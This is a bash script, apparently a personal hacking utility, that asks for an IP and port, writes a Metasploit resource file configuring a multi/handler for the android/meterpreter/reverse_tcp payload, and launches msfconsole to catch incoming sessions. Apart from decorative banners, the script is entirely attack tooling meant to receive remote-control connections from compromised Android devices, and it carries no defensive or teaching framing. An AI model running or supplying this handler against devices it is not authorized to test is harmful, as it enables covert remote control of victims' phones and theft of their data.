#!/bin/bash
#Check for root privileges
if (( EUID != 0 )); then
  echo "This script needs root"
  exit 1
fi
tput setaf 1;
echo ">>>>>>>>>>>>>>>>>:::::::::::::::::::::::::::::::: )WELCOME TO HACKING MY FRIEND::::::::::::::::::::::::::::::::::::::<<<<<<<<<<<<<<<<<<<<<<"
echo ">>>>>>>>>>>>>>>>>**************************************************************************************************<<<<<<<<<<<<<<<<<<<<<<<" 
echo
echo
tput sgr0;
tput setaf 4;
bannr=">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  YOKESH RANA HANDLER V1 ENCODED   <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<"
tput sgr0;
echo  $bannr
echo
echo
tput setaf 1;
echo ">>>>>>>>>>>>>>>>>>>>>==================================CHECKING TARGET SYSTEM  ==========================================<<<<<<<<<<<<<<<<<<<"
echo 
echo ">>>>>>>>>>>>>>>>>>>>>----------------------------------------------------------------------------------------------------<<<<<<<<<<<<<<<<<<<"
echo ">>>>>>>>>>>>>>>>>>>>>----------------------------------------------------------------------------------------------------<<<<<<<<<<<<<<<<<<<"

tput sgr0;
read -p "                                                ENTER THE HOST IP: " ip
tput setaf 1;
echo ">>>>>>>>>>>>>>>>>>>>----------------------------------SETTING THE PROVIDED IP-------------------------------------------<<<<<<<<<<<<<<<<<<<<"
echo ">>>>>>>>>>>>>>>>>>>>>----------------------------------------------------------------------------------------------------<<<<<<<<<<<<<<<<<<<"
echo
echo
echo ">>>>>>>>>>>>>>>>>>>>>----------------------------------------------------------------------------------------------------<<<<<<<<<<<<<<<<<<<"
echo "IP SET "
tput sgr0;
echo
echo
echo  $bannr
echo ">>>>>>>>>>>>>>>>>**************************************************************************************************<<<<<<<<<<<<<<<<<<<<<<<" 
read -p "                                                 ENTER THE HOST PORT: " lprt

tput setaf 1;
echo ">>>>>>>>>>>>>>>>>>>>----------------------------------SETTING THE PROVIDED PORT------------------------------------------<<<<<<<<<<<<<<<<<<<<"


echo ">>>>>>>>>>>>>>>>>>>>>----------------------------------------------------------------------------------------------------<<<<<<<<<<<<<<<<<<<"
echo ">>>>>>>>>>>>>>>>>>>>>----------------------------------------------------------------------------------------------------<<<<<<<<<<<<<<<<<<<"
echo "PORT SET "
tput sgr0;
echo
echo
echo  $bannr
echo ">>>>>>>>>>>>>>>>>**************************************************************************************************<<<<<<<<<<<<<<<<<<<<<<<" 
echo "                                     LHOST = $ip and the LPORT = $lprt"
echo  $bannr
echo
echo
tput setaf 4;
echo "use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST $ip
set LPORT $lprt
set ExitOnSession false
exploit -j
"> /tmp/handler.rc
echo "HANDLER HAS BEEN GENERATED"
echo  $bannr
cd /home/y
msfconsole -r /tmp/handler.rc




